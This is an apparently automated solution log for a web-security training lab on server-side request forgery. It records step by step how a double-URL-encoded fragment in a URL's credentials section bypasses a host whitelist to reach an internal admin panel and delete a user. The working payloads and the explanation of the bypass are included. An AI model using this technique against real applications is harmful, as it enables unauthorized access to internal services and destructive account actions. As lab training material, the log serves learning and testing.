steps: Explored the target application homepage and discovered product pages with stock check feature
Identified the POST /product/stock endpoint with stockApi parameter pointing to http://stock.weliketoshop.net:8080/product/stock/check
Confirmed whitelist filter: direct http://127.0.0.1/ returns 'External stock check host must be stock.weliketoshop.net'
Tested embedded credentials: http://username@stock.weliketoshop.net/ accepted (500 error trying to connect to 'username')
Tested # fragment: http://username#@stock.weliketoshop.net/ rejected by whitelist
Tested double-URL-encoded #: http://username%2523@stock.weliketoshop.net/ gives 500 (server tried to connect)
Used raw content body to avoid httpx re-encoding: stockApi=http://localhost%2523@stock.weliketoshop.net/admin returned 200 with admin panel HTML
Found delete link: /admin/delete?username=carlos on the admin page
evidence: Admin page accessed via SSRF returned HTTP 200 with user list showing wiener and carlos with delete links
Delete request returned HTTP 401 but the lab banner changed to 'is-solved' class
Homepage check confirmed 'solved' text present in response
comments: The SSRF whitelist bypass works by using double-URL-encoded # (%2523) in the URL credentials section. The URL parser sees stock.weliketoshop.net as the hostname (passing the whitelist), but the server double-decodes the URL: %25->% then %23-># making localhost the actual target host. The key was sending the payload as raw form body content to prevent httpx from re-encoding the %2523.
